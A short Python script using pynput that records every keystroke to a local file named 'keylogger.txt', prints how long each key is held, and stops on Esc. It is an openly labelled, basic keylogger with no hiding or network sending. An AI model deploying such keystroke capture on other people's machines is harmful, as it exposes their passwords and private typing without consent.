import os
import time

import pynput
from pynput import keyboard
from pynput.keyboard import Key

t = 0


def on_key_press(key: Key) -> None:
    global t
    t = time.time()


def on_key_release(key: Key) -> None:
    global t
    time_taken = round(time.time() - t, 2)
    print("The key", key, " is pressed for", time_taken, 'seconds')

    with open("keylogger.txt", "a") as f:
        f.write(str(key))
        if key == keyboard.Key.esc:
            # Stop listener
            return False


if __name__ == "__main__":
    if os.path.exists("keylogger.txt"):
        os.remove("keylogger.txt")

    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()
